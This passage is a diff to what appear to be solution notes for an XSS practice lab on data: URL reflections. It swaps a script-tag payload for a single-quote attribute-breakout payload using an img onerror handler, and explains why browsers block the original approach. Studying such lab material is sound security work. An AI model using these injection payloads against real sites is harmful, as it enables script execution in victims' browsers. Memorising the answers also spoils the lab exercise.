@@ -4,10 +4,10 @@ Reflections into data:text/html sinks via href / src / data attributes.
 
 ### dataurl-level1
 
-`/dataurl/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`
+`/dataurl/level1/?query=%27%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `<script>alert(1)</script>`
-- context: inside `<a href='data:text/html,...'>` — executes when victim clicks
+- payload: `'><img src=x onerror=alert(1)>`
+- context: single-quoted `<a href='data:text/html,...'>`; browsers block top-level data: navigation, so break out of the attribute
 
 ### dataurl-level2
 
